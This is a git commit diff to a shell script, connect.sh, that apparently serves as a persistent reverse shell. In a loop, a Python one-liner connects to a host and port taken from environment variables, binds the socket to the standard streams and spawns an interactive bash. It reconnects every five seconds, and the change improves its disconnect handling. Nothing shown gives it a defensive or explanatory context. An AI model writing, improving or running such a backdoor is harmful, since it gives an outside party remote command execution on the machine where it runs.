8bdf9b6ebe905c2e8f66ddf0e820e94d46bdf08e
mradigen <55953083+mradigen@users.noreply.github.com>
2025-09-05 17:31:04 +0530

    u

--- connect.sh
+++ connect.sh
@@ -5,15 +5,25 @@ export RPORT=19088
 
 while true; do
     python3 -c '
-import sys, socket, os, pty
+import sys, socket, os, pty, select
 s = socket.socket()
 try:
     s.connect((os.getenv("RHOST"), int(os.getenv("RPORT"))))
 except Exception:
     sys.exit(1)
+
+# Attach stdin/stdout/stderr
 for fd in (0,1,2):
     os.dup2(s.fileno(), fd)
-pty.spawn("bash")
+
+# Monitor connection and exit if it closes
+try:
+    pty.spawn("bash")
+except OSError:
+    pass
+finally:
+    s.close()
+    sys.exit(0)
 '
     echo "[*] Disconnected, retrying in 5 seconds..."
     sleep 5
